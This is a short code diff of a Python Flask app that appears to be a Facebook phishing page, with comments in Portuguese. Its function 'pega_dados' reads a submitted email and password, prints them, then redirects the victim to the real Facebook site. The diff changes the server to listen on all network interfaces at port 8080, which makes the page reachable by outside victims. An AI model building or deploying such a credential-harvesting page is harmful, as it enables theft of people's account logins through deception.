@@ -13,4 +13,4 @@ def pega_dados():
     senha = request.form['pass']
     print(f'EMAIL: {email} \n SENHA: {senha}')
     return redirect('https://www.facebook.com/?locale=pt_BR')
-app.run()
+app.run(host = "0.0.0.0" , port = "8080")
